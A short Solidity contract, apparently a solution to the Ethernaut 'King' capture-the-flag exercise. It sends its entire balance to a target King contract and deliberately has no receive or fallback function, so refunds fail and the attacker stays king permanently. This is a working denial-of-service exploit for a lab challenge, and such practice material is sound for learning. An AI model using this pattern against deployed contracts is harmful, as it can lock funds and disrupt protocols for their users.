// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./King.sol";
import "hardhat/console.sol";

contract AttackingKing {
    King public king;

    constructor(address payable _king) payable {
        king = King(_king);
    }

    // if no recieve or fallback function is defined, the contract will not be able to receive funds
    // therefore, I will stay as the King forever!

    function hackContract() external {
        // Code me!
        address(king).call{value: address(this).balance}("");
    }
}
